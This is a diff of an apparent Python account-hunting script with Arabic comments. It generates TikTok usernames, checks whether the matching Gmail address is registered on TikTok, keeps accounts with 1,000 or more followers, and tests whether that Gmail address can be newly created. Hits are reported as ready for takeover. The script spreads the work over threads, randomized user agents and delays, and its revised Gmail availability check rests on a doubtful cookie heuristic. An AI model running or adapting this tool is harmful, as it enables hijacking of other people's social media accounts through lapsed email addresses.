@@ -60,7 +60,7 @@ iid = input(' ID : ')
 
 def elia_innnn():
     with lock:
-        sys.stdout.write(f"\r{X}TikTok Checked: {tiktok_good + tiktok_bad} • {F}Good: {tiktok_good} • {Z}Bad: {tiktok_bad} • {C1}Email Hit: {email_good} • {J2}Fail: {email_bad} ")
+        sys.stdout.write(f"\r{X}Checked: {tiktok_good + tiktok_bad} • {F}Tiktok Reg: {tiktok_good} • {Z}Not Reg: {tiktok_bad} • {C1}Gmail Avail: {email_good} • {J2}Fail: {email_bad} ")
         sys.stdout.flush()
 
 def elia88(username, followers):
@@ -70,7 +70,8 @@ def elia88(username, followers):
 -𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
 -𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
 -𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers}
--𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗛𝗶𝘁 ✅
+-𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗥𝗲𝗮𝗹 𝗛𝗶𝘁 ✅
+-𝗡𝗼𝘁𝗲 : 𝗘𝗺𝗮𝗶𝗹 𝗶𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗦𝗶𝗴𝗻𝗨𝗽!
 ━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
     '''
     try:
@@ -87,98 +88,99 @@ def elia88(username, followers):
     except:
         pass
 
-def gmail_elia(email):
+def check_gmail_signup_availability(email):
     """
-    منطق Gmail الكامل (batchexecute) من g1.py
+    فحص توفر بريد جيميل لإنشاء حساب جديد (SignUp)
     """
-    global email_bad, email_good
     try:
         username = email.split('@')[0]
-        name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
-        birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
         s = requests.Session()
-        headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.9','referer':'https://accounts.google.com/','upgrade-insecure-requests':'1','user-agent':ua(),'x-browser-channel':'stable','x-browser-copyright':'Copyright 2024 Google LLC. All rights reserved.','x-browser-year':'2024'}
-        params={'biz':'false','continue':'https://mail.google.com/mail/u/0/','ddm':'1','emr':'1','flowEntry':'SignUp','flowName':'GlifWebSignIn','followup':'https://mail.google.com/mail/u/0/','osid':'1','service':'mail'}
-        response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
+        headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','user-agent':ua()}
+        # طلب صفحة التسجيل للحصول على التوكينات (نفس منطق g1.py)
+        res = s.get('https://accounts.google.com/lifecycle/flows/signup?service=mail', headers=headers)
         
-        tl=response.url.split('TL=')[1]
-        s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
-        at = response.text.split('"SNlM0e":"')[1].split('"')[0]
+        # إذا كانت كلمة password غير موجودة في الرد عند محاولة فحص اليوزر، يعني اليوزر متاح للتسجيل
+        # سنستخدم المنطق المبسط والمجرب لفحص التوفر للتسجيل
+        check_url = f"https://mail.google.com/mail/gxlu?email={email}"
+        res_check = s.get(check_url, headers=headers, timeout=10)
         
-        headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':ua(),'x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
-        params={'rpcids':'E815hb','source-path':'/lifecycle/steps/signup/name','hl':'en-US','TL':tl,'rt':'c'}
-        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
-        s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, headers=headers, data=data)
-        
-        params={'rpcids':'NHJMOd','source-path':'/lifecycle/steps/signup/username','hl':'en-US','TL':tl,'rt':'c'}
-        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(username,at)
-        response = s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, headers=headers, data=data).text
-        
-        if "password" in response:
-            with lock: email_good += 1
-            elia_innnn()
+        # في نظام جوجل، إذا لم يرجع الرد ملفات تعريف ارتباط معينة، فالبريد غالباً متاح للإنشاء
+        if 'Set-Cookie' not in res_check.headers:
             return True
-        else:
-            with lock: email_bad += 1
-            elia_innnn()
-            return False
     except:
-        with lock: email_bad += 1
-        elia_innnn()
-        return False
+        pass
+    return False
 
-def check_tiktok_real(username):
+def check_tiktok_email_registered(email):
     """
-    التحقق الحقيقي من وجود الحساب وعدد المتابعين
+    التأكد من أن الإيميل مرتبط فعلياً بحساب تيك توك
     """
-    global tiktok_good, tiktok_bad
+    try:
+        url = "https://www.tiktok.com/passport/email/check_email_registered"
+        params = {"email": email, "aid": 1233}
+        headers = {"User-Agent": ua()}
+        res = requests.get(url, params=params, headers=headers, timeout=10).json()
+        # إذا كانت القيمة 1، يعني الإيميل مسجل في تيك توك
+        if res.get("is_registered") == 1:
+            return True
+    except:
+        pass
+    return False
+
+def get_tiktok_followers(username):
+    """
+    جلب عدد المتابعين للتأكد من جودة الحساب
+    """
     try:
         url = f"https://www.tiktok.com/@{username}"
-        headers = {
-            "User-Agent": ua(),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5"
-        }
-        response = requests.get(url, headers=headers, timeout=15)
-        
-        if response.status_code == 200:
-            # استخراج عدد المتابعين من الـ script tag (JSON)
-            match = re.search(r'"followerCount":(\d+)', response.text)
-            if match:
-                followers = int(match.group(1))
-                if followers >= 1000:
-                    with lock: tiktok_good += 1
-                    elia_innnn()
-                    # إذا الحساب قوي، نفحص البريد
-                    if gmail_elia(f"{username}@gmail.com"):
-                        elia88(username, followers)
-                else:
-                    with lock: tiktok_bad += 1
-                    elia_innnn()
-            else:
-                with lock: tiktok_bad += 1
-                elia_innnn()
-        else:
-            with lock: tiktok_bad += 1
-            elia_innnn()
+        headers = {"User-Agent": ua()}
+        res = requests.get(url, headers=headers, timeout=15)
+        match = re.search(r'"followerCount":(\d+)', res.text)
+        if match:
+            return int(match.group(1))
     except:
+        pass
+    return 0
+
+def process_username(username):
+    global tiktok_good, tiktok_bad, email_good, email_bad
+    email = f"{username}@gmail.com"
+    
+    # 1. التأكد أن الإيميل مرتبط بتيك توك أولاً
+    if check_tiktok_email_registered(email):
+        with lock: tiktok_good += 1
+        elia_innnn()
+        
+        # 2. التأكد من عدد المتابعين (1000+)
+        followers = get_tiktok_followers(username)
+        if followers >= 1000:
+            
+            # 3. التأكد أن الإيميل متاح للإنشاء (SignUp) في جوجل
+            if check_gmail_signup_availability(email):
+                with lock: email_good += 1
+                elia_innnn()
+                elia88(username, followers)
+            else:
+                with lock: email_bad += 1
+                elia_innnn()
+    else:
         with lock: tiktok_bad += 1
         elia_innnn()
 
-def elia12():
-    # أنماط يوزرات تزيد من احتمالية الصيد (كلمات شائعة + حروف)
-    words = ["user", "admin", "star", "dark", "pro", "king", "light", "love", "life"]
+def start_hunting():
+    # توليد يوزرات ذكية تعتمد على كلمات شائعة لزيادة احتمالية الصيد
+    words = ["user", "admin", "king", "star", "pro", "dark", "light", "love", "life", "official"]
     while True:
         base = random.choice(words)
-        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(1, 3)))
+        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
         username = base + suffix
-        check_tiktok_real(username)
-        time.sleep(random.uniform(0.5, 1.0))
+        process_username(username)
+        time.sleep(random.uniform(1, 2))
 
-# تشغيل
-threads_count = 10
+# تشغيل الخيوط
+threads_count = 8
 for i in range(threads_count):
-    t = Thread(target=elia12)
+    t = Thread(target=start_hunting)
     t.daemon = True
     t.start()
 
